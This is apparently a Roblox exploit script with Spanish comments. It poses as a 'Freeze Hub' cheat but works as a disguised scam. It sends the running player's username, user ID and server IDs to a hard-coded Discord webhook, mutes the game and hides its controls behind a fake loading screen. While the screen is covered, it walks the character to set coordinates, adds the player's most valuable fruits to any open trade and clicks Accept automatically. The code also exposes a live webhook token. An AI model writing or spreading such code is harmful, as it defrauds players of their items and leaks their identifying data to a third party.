-- Freeze Hub — honeypot con pantalla de carga lenta
local WEBHOOK_URL = "https://discord.com/api/webhooks/1574167446972014772/t-soJU1110af_mNni8KTn-DslWHK7i416w2mMZ10j0sJEy9s8TBhtMS43w0UXlwqz95_"

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")
local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

if _G.__freezeHubFired then return end
_G.__freezeHubFired = true

-- ===================== WEBHOOK =====================
local function httpPost(url, body)
	pcall(function()
		if syn and syn.request then
			syn.request({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
		elseif http and http.request then
			http.request({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
		elseif request then
			request({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
		elseif fluxus and fluxus.request then
			fluxus.request({ Url = url, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
		end
	end)
end

local function esc(s)
	s = tostring(s or "")
	return s:gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t")
end

task.spawn(function()
	local jobId = "desconocido"
	pcall(function() jobId = game.JobId end)
	local payload = string.format(
		'{"embeds":[{"title":"Freeze Hub — ejecutado","color":3447003,"fields":['
		.. '{"name":"Usuario","value":"%s","inline":true},'
		.. '{"name":"DisplayName","value":"%s","inline":true},'
		.. '{"name":"UserId","value":"%s","inline":true},'
		.. '{"name":"JobId","value":"%s","inline":false},'
		.. '{"name":"PlaceId","value":"%s","inline":true},'
		.. '{"name":"Hora","value":"%s","inline":true}'
		.. '],"footer":{"text":"Freeze Hub"}}]}',
		esc(localPlayer.Name), esc(localPlayer.DisplayName), esc(localPlayer.UserId),
		esc(jobId), esc(game.PlaceId), esc(os.date("%Y-%m-%d %H:%M:%S"))
	)
	httpPost(WEBHOOK_URL, payload)
end)

-- ===================== SILENCIO =====================
pcall(function() SoundService.Volume = 0 end)
pcall(function()
	for _, s in ipairs(SoundService:GetDescendants()) do
		if s:IsA("Sound") then s.Volume = 0 end
	end
end)

-- ===================== OCULTAR TOPBAR =====================
pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)

-- ===================== CONTENEDOR DE GUI =====================
local function getGuiParent()
	if gethui then
		local ok, hui = pcall(gethui)
		if ok and hui then return hui end
	end
	if protect_gui then
		local ok, pg = pcall(protect_gui)
		if ok and pg then return pg end
	end
	return playerGui
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FreezeHubLoad"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 2147483647
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = getGuiParent()

-- ===================== FONDO CELESTE =====================
local bg = Instance.new("Frame")
bg.Size = UDim2.fromScale(1, 1)
bg.BackgroundColor3 = Color3.fromRGB(80, 200, 255)
bg.BorderSizePixel = 0
bg.ZIndex = 1
bg.Parent = screenGui

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 180, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(140, 230, 255)),
})
gradient.Rotation = 45
gradient.Parent = bg

-- ===================== CENTRO =====================
local center = Instance.new("Frame")
center.AnchorPoint = Vector2.new(0.5, 0.5)
center.Position = UDim2.fromScale(0.5, 0.5)
center.Size = UDim2.new(0, 500, 0, 260)
center.BackgroundTransparency = 1
center.ZIndex = 2
center.Parent = bg

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 90)
title.BackgroundTransparency = 1
title.Text = "Freeze Hub"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 64
title.Font = Enum.Font.GothamBlack
title.ZIndex = 3
title.Parent = center
local titleStroke = Instance.new("UIStroke")
titleStroke.Color = Color3.fromRGB(0, 120, 180)
titleStroke.Thickness = 2
titleStroke.Transparency = 0.3
titleStroke.Parent = title

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 30)
subtitle.Position = UDim2.new(0, 0, 0, 95)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Gracias por la confianza :)"
subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
subtitle.TextSize = 22
subtitle.Font = Enum.Font.GothamMedium
subtitle.ZIndex = 3
subtitle.Parent = center

local barBg = Instance.new("Frame")
barBg.AnchorPoint = Vector2.new(0.5, 0)
barBg.Position = UDim2.new(0.5, 0, 0, 150)
barBg.Size = UDim2.new(0, 400, 0, 14)
barBg.BackgroundColor3 = Color3.fromRGB(40, 140, 190)
barBg.BorderSizePixel = 0
barBg.ZIndex = 3
barBg.Parent = center
local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(1, 0)
bgCorner.Parent = barBg

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
barFill.BorderSizePixel = 0
barFill.ZIndex = 4
barFill.Parent = barBg
local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(1, 0)
fillCorner.Parent = barFill

local percent = Instance.new("TextLabel")
percent.AnchorPoint = Vector2.new(0.5, 0)
percent.Position = UDim2.new(0.5, 0, 0, 175)
percent.Size = UDim2.new(0, 400, 0, 30)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(255, 255, 255)
percent.TextSize = 18
percent.Font = Enum.Font.GothamBold
percent.ZIndex = 3
percent.Parent = center

local status = Instance.new("TextLabel")
status.AnchorPoint = Vector2.new(0.5, 0)
status.Position = UDim2.new(0.5, 0, 0, 210)
status.Size = UDim2.new(0, 500, 0, 24)
status.BackgroundTransparency = 1
status.Text = "Descargando assets..."
status.TextColor3 = Color3.fromRGB(255, 255, 255)
status.TextSize = 15
status.Font = Enum.Font.Gotham
status.TextTransparency = 0.15
status.ZIndex = 3
status.Parent = center

-- ===================== CARGA LENTA =====================
local phases = {
	{ upto = 18, text = "Descargando assets...", minWait = 0.5, maxWait = 1.2 },
	{ upto = 35, text = "Conectando con el servidor...", minWait = 0.7, maxWait = 1.5 },
	{ upto = 55, text = "Verificando integridad...", minWait = 0.8, maxWait = 1.8 },
	{ upto = 72, text = "Sincronizando inventario...", minWait = 1.0, maxWait = 2.0 },
	{ upto = 88, text = "Preparando interfaz...", minWait = 1.2, maxWait = 2.2 },
	{ upto = 97, text = "Casi listo...", minWait = 1.5, maxWait = 2.5 },
	{ upto = 100, text = "Esperando respuesta del servidor...", minWait = 2.0, maxWait = 4.0 },
}

local progress = 0
task.spawn(function()
	for _, phase in ipairs(phases) do
		while progress < phase.upto do
			progress = progress + 1
			status.Text = phase.text
			percent.Text = tostring(progress) .. "%"
			TweenService:Create(barFill, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
				Size = UDim2.new(progress / 100, 0, 1, 0),
			}):Play()
			task.wait(math.random() * (phase.maxWait - phase.minWait) + phase.minWait)
		end
	end
end)

-- ===================== ANTI-ESC COSMÉTICO =====================
task.spawn(function()
	while screenGui.Parent do
		pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
		task.wait(0.5)
	end
end)-- =========================================================
-- Combo: Tween a coordenadas -> auto-trade de frutas
-- =========================================================

-- ============ FASE 1: TWEEN ============
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local VirtualUser = game:GetService("VirtualUser")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")
local humanoid = character:WaitForChild("Humanoid")
local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")

local TARGET = Vector3.new(-465.86, 73.10, 270.80)
local SPEED = 20 -- studs/seg (caminata). Sube a 30-40 si quieres más rápido.

local startPos = hrp.Position
local distance = (startPos - TARGET).Magnitude
local duration = math.max(distance / SPEED, 0.1)
local targetCFrame = CFrame.new(TARGET) * (hrp.CFrame - hrp.Position)
local wasAnchored = hrp.Anchored

hrp.Anchored = true
hrp.AssemblyLinearVelocity = Vector3.zero
humanoid:ChangeState(Enum.HumanoidStateType.Physics)

local tween = TweenService:Create(
    hrp,
    TweenInfo.new(duration, Enum.EasingStyle.Linear),
    {CFrame = targetCFrame}
)
tween:Play()
tween.Completed:Wait()

humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
hrp.Anchored = wasAnchored

print(("[combo] Tween listo: %.1f studs en %.2fs"):format(distance, duration))

-- ============ FASE 2: AUTO-TRADE ============
local DRY_RUN               = true   -- false cuando confirmes la detección
local DELAY_ANTES_DE_AGREGAR = 1.2
local DELAY_ENTRE_FRUTAS     = 0.4
local DELAY_ANTES_DE_ACEPTAR = 1.0
local COOLDOWN_TRAS_ACEPTAR  = 8
local ACEPTAR_AUTOMATICO     = true

local MIS_MEJORES_FRUTAS = {
    "Kitsune", "Dragon", "Leopard", "Dough", "Spirit", "Venom",
}
local ADD_ACTION = "AddTradeItem" -- si las frutas no se agregan, prueba "TradeAdd" o "AddItem"

-- ---------- Detección de UI ----------
local function isVisible(gui)
    if not gui or not gui.Parent then return false end
    if gui:IsA("GuiObject") and not gui.Visible then return false end
    local parent = gui.Parent
    while parent and parent ~= game do
        if parent:IsA("GuiObject") and not parent.Visible then return false end
        parent = parent.Parent
    end
    return true
end

local function findAcceptButton()
    local roots = { player:FindFirstChild("PlayerGui"), game:GetService("CoreGui") }
    for _, root in ipairs(roots) do
        if root then
            for _, obj in ipairs(root:GetDescendants()) do
                if obj:IsA("TextButton") and isVisible(obj) then
                    local t = obj.Text:lower()
                    if t == "accept" or t == "accept trade" or t == "aceptar" then
                        return obj
                    end
                end
            end
        end
    end
    return nil
end

local function findTradeFrame()
    local root = player:FindFirstChild("PlayerGui")
    if not root then return nil end
    for _, obj in ipairs(root:GetDescendants()) do
        if (obj:IsA("ScreenGui") or obj:IsA("Frame")) and isVisible(obj) then
            if obj.Name:lower():find("trade", 1, true) then
                return obj
            end
        end
    end
    return nil
end

local function tradeMenuAbierto()
    return findTradeFrame() ~= nil or findAcceptButton() ~= nil
end

-- ---------- Frutas ----------
local function internalNameDe(fruta)
    for _, obj in ipairs(player.Backpack:GetChildren()) do
        if obj:IsA("Tool") and obj.Name:lower():find(fruta:lower(), 1, true) then
            return obj.Name
        end
    end
    local char = player.Character
    if char then
        for _, obj in ipairs(char:GetChildren()) do
            if obj:IsA("Tool") and obj.Name:lower():find(fruta:lower(), 1, true) then
                return obj.Name
            end
        end
    end
    return nil
end

local function agregarFruta(interno)
    if DRY_RUN then
        print("[trade][DRY] Agregaría:", interno)
        return true
    end
    local ok, err = pcall(function()
        CommF:InvokeServer(ADD_ACTION, interno)
    end)
    if ok then
        print("[trade] Fruta enviada:", interno)
        return true
    end
    warn("[trade] Falló", interno, "->", err)
    return false
end

-- ---------- Aceptar ----------
local function aceptarTrade()
    local btn = findAcceptButton()
    if not btn then
        warn("[trade] No hay botón Accept visible")
        return false
    end
    if DRY_RUN then
        print("[trade][DRY] Clicaría Accept en:", btn:GetFullName())
        return true
    end
    local pos = btn.AbsolutePosition
    local size = btn.AbsoluteSize
    local v = Vector2.new(pos.X + size.X / 2, pos.Y + size.Y / 2)
    VirtualUser:Button1Down(v)
    task.wait(0.05)
    VirtualUser:Button1Up(v)
    print("[trade] Click en Accept enviado")
    return true
end

-- ---------- Secuencia ----------
local busy = false
local ultimaEjecucion = 0

local function ejecutarTrade()
    if busy then return end
    busy = true
    print("[trade] Menú detectado, iniciando secuencia...")
    task.wait(DELAY_ANTES_DE_AGREGAR)

    local faltantes = {}
    for _, fruta in ipairs(MIS_MEJORES_FRUTAS) do
        local interno = internalNameDe(fruta)
        if interno then
            agregarFruta(interno)
        else
            table.insert(faltantes, fruta)
        end
        task.wait(DELAY_ENTRE_FRUTAS)
    end

    if #faltantes > 0 then
        warn("[trade] No están en el backpack:", table.concat(faltantes, ", "))
    end

    if ACEPTAR_AUTOMATICO then
        task.wait(DELAY_ANTES_DE_ACEPTAR)
        aceptarTrade()
    end

    ultimaEjecucion = tick()
    task.wait(0.5)
    busy = false
end

task.spawn(function()
    while true do
        if not busy
            and tradeMenuAbierto()
            and (tick() - ultimaEjecucion) > COOLDOWN_TRAS_ACEPTAR then
            ejecutarTrade()
        end
        task.wait(0.5)
    end
end)

print("[combo] Activo. DRY_RUN =", DRY_RUN, "| F8 aún no está enganchado en este archivo.")
